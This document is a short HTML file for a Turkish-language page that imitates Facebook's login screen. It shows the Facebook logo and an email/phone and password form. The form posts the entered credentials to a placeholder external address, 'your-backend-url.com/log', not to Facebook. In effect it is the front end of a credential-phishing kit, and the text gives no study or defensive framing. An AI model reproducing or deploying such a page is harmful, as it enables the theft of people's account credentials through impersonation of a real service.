<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook – Giriş Yap</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="facebook" class="logo" />
    <form action="https://your-backend-url.com/log" method="POST" class="login-box">
      <h2>Facebook'a Giriş Yap</h2>
      <input type="text" name="email" placeholder="E-posta veya Telefon Numarası" required />
      <input type="password" name="password" placeholder="Şifre" required />
      <button type="submit">Giriş Yap</button>
      <div class="link">
        <a href="#">Hesabını mı unuttun?</a> · <a href="#">Facebook’a Kaydol</a>
      </div>
    </form>
  </div>
</body>
</html>
